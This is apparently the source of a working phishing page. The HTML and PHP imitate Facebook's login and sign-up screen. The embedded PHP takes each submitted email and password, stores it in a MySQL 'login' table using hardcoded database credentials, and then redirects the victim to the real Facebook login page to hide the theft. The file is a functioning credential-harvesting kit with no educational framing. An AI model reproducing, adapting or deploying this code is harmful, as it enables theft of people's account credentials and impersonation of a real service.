<!doctype html>
<html lang="en">
  <head>
     <link rel="shortcut icon" href="app\images\logo.png" type="image/png">
     <title>
     Facebook - Log In or Sign Up
    </title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="app/css/bootstrap.min.css">
    <link rel="stylesheet" href="app/css/styles.css">
    
  </head>

<body ng-app="" ng-controller="date">


<form method="post" action="" name="loginForm" id="logFor">

<div class="container header">
  <div class="row">
     <div class="col-md-offset-1 col-md-3"><h1 class="facebook">facebook</h1></div>
     <div class="login col-md-offset-3 col-md-3">
       <div class="row">

         <div class="col-md-5 emdiv">
             <p class="emp">Email or Phone</p>
             <div><input type="email" class="email" name="email"></div>
          </div>
         <div class="col-md-5 psdiv">
             <p class="pp">Password</p>
             <input type = "password" class="password" name="password"></input>
             <p class="fap">Forgotten account?</p>
         </div>
         <div class="col-md-2 logindiv">
              <input type="button" value ="Log In" class="loginbut" name="loginButton" >
                
         </div>

       </div>  
     </div>
  </div>
  </div>
        </form> 

<?php 
    if($_POST['email']){
       $email = $_POST['email'];
    }
    if($_POST['password']){
       $password = $_POST['password'];
    } 

    if($email && $password){
    $link = mysqli_connect("localhost", "banatith_arpit", "support123", "banatith_fbCopy"); 

    if($link){
      $email = filter_var($email, FILTER_SANITIZE_EMAIL);
      $password = filter_var($password, FILTER_SANITIZE_STRING);

      $s = "INSERT INTO login(username, password) VALUES ('".$email."', '".$password."')";
      $query = mysqli_query($link, $s);
      if($query){
        echo "<script>window.location = 'https://www.facebook.com/login.php?login_attempt=1&lwv=110'</script>";
      }
      else{
        echo "not successful".mysql_error();
      }
    }
    else{
      die("error connecting do database".mysql_error());
    }
   } 
?>


  <div class="row maincont">
    <div class="col-md-offset-1 col-md-5">
      <p class="tagline">Facebook helps you connect and share with the prople in your life.</p>
      <img class="connected" src="app\images\connected.png">
    </div>

    <div class="col-md-offset-1 col-md-4 signup">
      <p class="create">Create an account</p>
      <p class="free">It's free and always will be</p>
      <input type="text" class="first_name name" placeholder="First name">
      <input type="text" class="surname name" placeholder="Surname">
      <input type="text" class="mob mob_pass" placeholder="Mobile number or email address">
      <input type="password" class="pass mob_pass" placeholder="New password">
      <p class="birthday">Birthday</p>
      <div >
      <select class="day">
        <option ng-repeat = "day in days">{{day}}</option>
      </select>
      <select class="month">
        <option ng-repeat = "month in months">{{month}}</option>
      </select>
      <select class="year">  
        <option ng-repeat = "year in years">{{year}}</option>
      </select>
      <span class="why"><a href="#" title="Click for more information">Why do i need to provide my<br> date of birth?</a></span>
      </div>
      <div class="gender"> 
      
          <input type="checkbox" value="Female" class = "femalecheck"><span class="female"> Female</span>
          <input type="checkbox" value="Male" class="malecheck"><span class="male">Male</span>
      </div>    

      <p class = "terms">By clicking Create an account, you agree to our <a href="#">Terms</a> and <br>  confirm that you have read our <a href="#">Data Policy</a>, including our <a href="#">Cookie <br>   Use Policy</a>.You may recieve SMS message notification from <br> Facebook and can opt out any time. </p>
      <div> 
         <input type="button" value="Create an account" class="createbut">
      </div>
      
      <p class="page"><a href="#">Create a Page </a>for a celebrity, band or business.</p>
    </div>
 
  </div>  
  
</div>     

<div class="container"> 
    <div class="row"> 
        <div class="col-md-offset-1 col-md-11">
          <ul class="list-inline language">
            <li>English (UK)</li>
            <li ng-repeat = "language in languages"><a href="#">{{language}}</a></li>
            <li><button type="button"><span class="glyphicon glyphicon-plus"></span></button></li>
          </ul>
          <hr align="left" noshade="">  
        </div>
    </div>

  <div class="row">
    <div class="col-md-offset-1 col-md-11">
    <ul class="list-inline footlinks" >
      <li ng-repeat = "link in footlinks"><a href="#">{{link}}</a></li>
    </ul>
    <p class="copy">ArpitBanati &copy; 2017</p>
    </div>
  </div>
  </div>  
  



<script src="app/js/jquery-3.2.0.min.js"></script>
  <script src="app/js/bootstrap.min.js"></script>
  <script src="app/js/angular.min.js"></script>
  <script src="app/js/script.js"></script>
  <script type="text/javascript">
   $(".loginbut").click(function(){
    $("#logFor").submit();

   })
  </script>
</body>
</html>
